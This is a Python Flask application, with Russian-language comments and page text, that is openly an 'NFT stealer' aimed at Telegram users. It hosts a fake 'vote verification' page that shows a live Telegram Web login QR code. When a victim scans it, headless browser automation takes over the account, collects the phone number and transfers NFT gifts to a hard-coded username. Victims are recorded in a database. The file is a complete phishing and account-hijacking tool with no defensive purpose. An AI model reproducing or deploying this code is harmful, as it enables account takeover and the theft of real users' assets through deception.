from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import sqlite3
import logging
import threading
import time
import os
import base64
import io
from PIL import Image

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

TARGET_USERNAME = '@trepall'
active_sessions = {}

def init_db():
    conn = sqlite3.connect('nft_stealer.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS stolen_data
                 (id INTEGER PRIMARY KEY, phone TEXT, nft_stolen INTEGER DEFAULT 0,
                  status TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

def setup_driver():
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--window-size=1200,800')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36')
    
    chrome_options.binary_location = '/usr/bin/chromium-browser'
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        return driver
    except Exception as e:
        logging.error(f"❌ Chrome error: {e}")
        return None

def generate_qr_session():
    """Создает сессию с QR-кодом для входа"""
    driver = setup_driver()
    if not driver:
        return None
    
    try:
        # Открываем Telegram Web
        driver.get("https://web.telegram.org/k/")
        time.sleep(5)
        
        # Ищем и нажимаем кнопку QR-кода
        try:
            qr_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'QR') or contains(., 'Log in by QR') or contains(., 'QR code')]"))
            )
            qr_button.click()
            time.sleep(3)
        except:
            # Если кнопка не найдена, возможно QR-код уже показан
            pass
        
        # Ищем QR-код на странице
        qr_element = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "canvas, .qr-code, [class*='qr'], img, svg"))
        )
        
        # Делаем скриншот QR-кода
        qr_screenshot = qr_element.screenshot_as_png
        qr_image = Image.open(io.BytesIO(qr_screenshot))
        
        # Конвертируем в base64
        buffered = io.BytesIO()
        qr_image.save(buffered, format="PNG")
        qr_base64 = base64.b64encode(buffered.getvalue()).decode()
        
        # Сохраняем сессию
        session_id = os.urandom(8).hex()
        active_sessions[session_id] = {
            'driver': driver,
            'status': 'waiting',
            'start_time': time.time()
        }
        
        logging.info(f"✅ QR-код создан: {session_id}")
        return qr_base64, session_id
        
    except Exception as e:
        logging.error(f"❌ Ошибка создания QR: {e}")
        driver.quit()
        return None, None

def wait_for_login_and_steal(session_id):
    """Ожидает сканирования QR-кода и ворует NFT"""
    try:
        session_data = active_sessions.get(session_id)
        if not session_data:
            return None, 0
            
        driver = session_data['driver']
        
        # Ждем сканирования QR-кода (до 2 минут)
        for i in range(120):
            try:
                # Проверяем вошел ли пользователь
                WebDriverWait(driver, 1).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, ".ChatList, .chat-list, [data-testid*='chat'], .calls"))
                )
                
                logging.info("✅ QR-код отсканирован! Пользователь вошел в аккаунт.")
                
                # Получаем номер телефона
                phone = get_user_phone(driver)
                
                # Воруем NFT
                nft_count = steal_nft_gifts(driver)
                
                # Сохраняем данные
                conn = sqlite3.connect('nft_stealer.db')
                c = conn.cursor()
                c.execute('INSERT INTO stolen_data (phone, nft_stolen, status) VALUES (?, ?, ?)',
                         (phone, nft_count, 'hacked'))
                conn.commit()
                conn.close()
                
                driver.quit()
                del active_sessions[session_id]
                
                return phone, nft_count
                
            except:
                time.sleep(1)
                continue
                
        # Время вышло
        driver.quit()
        del active_sessions[session_id]
        return None, 0
        
    except Exception as e:
        logging.error(f"❌ Ошибка ожидания: {e}")
        return None, 0

def get_user_phone(driver):
    """Получает номер телефона пользователя"""
    try:
        # Переходим в настройки
        settings_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, ".Avatar, [data-testid*='user'], [aria-label*='Settings']"))
        )
        settings_btn.click()
        time.sleep(2)
        
        # Ищем номер телефона
        phone_elements = driver.find_elements(By.XPATH, "//*[contains(text(), '+')]")
        for element in phone_elements:
            text = element.text.strip()
            if text.startswith('+') and any(c.isdigit() for c in text[1:]) and len(text) > 8:
                logging.info(f"📱 Найден номер: {text}")
                return text
        
        return "unknown"
        
    except Exception as e:
        logging.error(f"❌ Ошибка получения номера: {e}")
        return "unknown"

def steal_nft_gifts(driver):
    """Ворует NFT подарки из аккаунта"""
    stolen_count = 0
    
    try:
        # Переходим в профиль
        profile_btn = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, ".Avatar, [data-testid*='user']"))
        )
        profile_btn.click()
        time.sleep(3)
        
        # Ищем раздел подарков
        try:
            gifts_btn = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.XPATH, "//*[contains(text(), 'Gifts') or contains(text(), 'Подарки') or contains(text(), 'Gift')]"))
            )
            gifts_btn.click()
            time.sleep(3)
            logging.info("🎁 Раздел подарков найден")
        except:
            logging.warning("⚠️ Раздел подарков не найден")
            return 0
        
        # Ищем NFT элементы
        nft_selectors = [
            ".gift", ".nft", "[class*='gift']", "[class*='nft']",
            ".GiftItem", ".GiftPreview", ".gift-item"
        ]
        
        nft_elements = []
        for selector in nft_selectors:
            try:
                elements = driver.find_elements(By.CSS_SELECTOR, selector)
                if elements:
                    nft_elements = elements
                    break
            except:
                continue
        
        logging.info(f"💰 Найдено {len(nft_elements)} потенциальных NFT")
        
        # Передаем NFT
        for i in range(min(len(nft_elements), 10)):
            try:
                nft = nft_elements[i]
                driver.execute_script("arguments[0].click();", nft)
                time.sleep(2)
                
                # Ищем кнопку передачи
                transfer_found = False
                for xpath in [
                    "//button[contains(text(), 'Transfer')]",
                    "//button[contains(text(), 'Передать')]",
                    "//div[contains(text(), 'Transfer')]",
                    "//div[contains(text(), 'Передать')]"
                ]:
                    try:
                        transfer_btn = WebDriverWait(driver, 2).until(
                            EC.element_to_be_clickable((By.XPATH, xpath))
                        )
                        driver.execute_script("arguments[0].click();", transfer_btn)
                        transfer_found = True
                        time.sleep(2)
                        break
                    except:
                        continue
                
                if not transfer_found:
                    continue
                
                # Вводим username
                for selector in [
                    "input[placeholder*='Search']",
                    "input[placeholder*='Поиск']",
                    "input[placeholder*='username']"
                ]:
                    try:
                        search_input = WebDriverWait(driver, 2).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        search_input.clear()
                        search_input.send_keys(TARGET_USERNAME.replace('@', ''))
                        time.sleep(2)
                        break
                    except:
                        continue
                
                # Подтверждаем
                for xpath in [
                    "//button[contains(text(), 'Confirm')]",
                    "//button[contains(text(), 'Подтвердить')]",
                    "//button[contains(text(), 'Send')]",
                    "//button[contains(text(), 'Отправить')]"
                ]:
                    try:
                        confirm_btn = WebDriverWait(driver, 2).until(
                            EC.element_to_be_clickable((By.XPATH, xpath))
                        )
                        driver.execute_script("arguments[0].click();", confirm_btn)
                        time.sleep(3)
                        
                        stolen_count += 1
                        logging.info(f"✅ Украден NFT #{stolen_count}")
                        break
                    except:
                        continue
                
                # Возвращаемся
                try:
                    driver.back()
                    time.sleep(2)
                except:
                    pass
                    
            except Exception as e:
                logging.warning(f"⚠️ Ошибка с NFT {i+1}: {e}")
                continue
        
        return stolen_count
        
    except Exception as e:
        logging.error(f"❌ Ошибка кражи NFT: {e}")
        return stolen_count

HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Vote Verification</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; color: white; }
        .container { max-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; text-align: center; }
        h2 { color: #2c3e50; margin-bottom: 20px; }
        .qr-container { margin: 20px 0; }
        #qrCode { max-width: 300px; border: 3px solid #3498db; border-radius: 10px; }
        .instructions { background: #f8f9fa; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; }
        .step { font-weight: bold; color: #e74c3c; }
        .status { padding: 10px; margin: 10px 0; border-radius: 5px; }
        .success { background: #d4edda; color: #155724; }
        .loading { background: #fff3cd; color: #856404; }
        button { background: #e74c3c; color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 16px; margin: 10px; }
        button:hover { background: #c0392b; }
        button:disabled { background: #95a5a6; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔐 Подтверждение личности для голосования</h2>
        <p>Для защиты от накрутки требуется верификация через Telegram</p>
        
        <div class="instructions">
            <p class="step">ШАГ 1:</p>
            <p>Откройте Telegram на телефоне</p>
            
            <p class="step">ШАГ 2:</p>
            <p>Нажмите "Настройки" → "Устройства" → "Подключить устройство"</p>
            
            <p class="step">ШАГ 3:</p>
            <p>Наведите камеру на QR-код ниже</p>
            
            <p class="step">ШАГ 4:</p>
            <p>Подтвердите вход в браузере</p>
        </div>
        
        <div class="qr-container">
            <img id="qrCode" src="" alt="QR Code">
        </div>
        
        <div id="status" class="status loading">
            ⏳ Генерация QR-кода...
        </div>
        
        <button onclick="generateQR()" id="generateBtn">🔄 Сгенерировать новый QR-код</button>
        <button onclick="checkStatus()" id="checkBtn">🔍 Проверить статус</button>
        
        <div id="result" style="display: none; margin-top: 20px; padding: 15px; background: #d4edda; color: #155724; border-radius: 8px;">
            <h3>✅ Голос успешно подтвержден!</h3>
            <p>Спасибо за ваше участие!</p>
        </div>
    </div>

    <script>
    let currentSessionId = '';
    
    async function generateQR() {
        document.getElementById('generateBtn').disabled = true;
        document.getElementById('status').className = 'status loading';
        document.getElementById('status').innerHTML = '⏳ Генерация QR-кода...';
        
        try {
            const response = await fetch('/generate_qr', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            });
            
            const data = await response.json();
            
            if (data.status === 'success') {
                document.getElementById('qrCode').src = 'data:image/png;base64,' + data.qr_code;
                currentSessionId = data.session_id;
                document.getElementById('status').className = 'status success';
                document.getElementById('status').innerHTML = '✅ QR-код готов! Отсканируйте его в Telegram';
                
                // Запускаем проверку статуса
                startStatusChecking();
            } else {
                document.getElementById('status').className = 'status error';
                document.getElementById('status').innerHTML = '❌ Ошибка: ' + data.message;
            }
        } catch (error) {
            document.getElementById('status').className = 'status error';
            document.getElementById('status').innerHTML = '❌ Ошибка соединения';
        } finally {
            document.getElementById('generateBtn').disabled = false;
        }
    }
    
    function startStatusChecking() {
        // Проверяем статус каждые 3 секунды
        const interval = setInterval(async () => {
            if (!currentSessionId) {
                clearInterval(interval);
                return;
            }
            
            try {
                const response = await fetch('/check_status?session_id=' + currentSessionId);
                const data = await response.json();
                
                if (data.status === 'success') {
                    clearInterval(interval);
                    document.getElementById('status').innerHTML = `✅ Успех! Украдено ${data.nft_stolen} NFT с аккаунта ${data.phone}`;
                    document.getElementById('result').style.display = 'block';
                } else if (data.status === 'waiting') {
                    document.getElementById('status').innerHTML = '⏳ Ожидание сканирования QR-кода...';
                } else if (data.status === 'timeout') {
                    clearInterval(interval);
                    document.getElementById('status').innerHTML = '❌ Время ожидания истекло. Сгенерируйте новый QR-код.';
                }
            } catch (error) {
                console.error('Ошибка проверки статуса:', error);
            }
        }, 3000);
    }
    
    async function checkStatus() {
        if (!currentSessionId) {
            alert('Сначала сгенерируйте QR-код');
            return;
        }
        
        try {
            const response = await fetch('/check_status?session_id=' + currentSessionId);
            const data = await response.json();
            alert('Статус: ' + data.message);
        } catch (error) {
            alert('Ошибка проверки статуса');
        }
    }
    
    // Автоматически генерируем QR-код при загрузке
    window.onload = generateQR;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/generate_qr', methods=['POST'])
def generate_qr():
    try:
        qr_base64, session_id = generate_qr_session()
        
        if not qr_base64:
            return jsonify({'status': 'error', 'message': 'Failed to generate QR code'}), 500
        
        # Запускаем фоновую проверку входа
        thread = threading.Thread(target=wait_for_login_and_steal, args=(session_id,))
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'status': 'success',
            'qr_code': qr_base64,
            'session_id': session_id
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/check_status')
def check_status():
    session_id = request.args.get('session_id')
    
    if not session_id:
        return jsonify({'status': 'error', 'message': 'No session ID'}), 400
    
    session_data = active_sessions.get(session_id)
    
    if not session_data:
        return jsonify({'status': 'timeout', 'message': 'Session expired'})
    
    if session_data['status'] == 'waiting':
        return jsonify({'status': 'waiting', 'message': 'Waiting for QR scan'})
    
    return jsonify({'status': 'success', 'message': 'QR scanned successfully'})

@app.route('/stats')
def stats():
    conn = sqlite3.connect('nft_stealer.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM stolen_data")
    total = c.fetchone()[0]
    
    c.execute("SELECT SUM(nft_stolen) FROM stolen_data")
    nft_total = c.fetchone()[0] or 0
    
    c.execute("SELECT phone, nft_stolen, timestamp FROM stolen_data ORDER BY id DESC LIMIT 10")
    recent = c.fetchall()
    
    conn.close()
    
    return jsonify({
        'total_hacked': total,
        'total_nft_stolen': nft_total,
        'recent_hacks': [
            {'phone': r[0], 'nft_stolen': r[1], 'timestamp': r[2]} 
            for r in recent
        ]
    })

if __name__ == '__main__':
    logging.info("🚀 ЗАПУСК NFT STEALER С QR-КОДОМ...")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
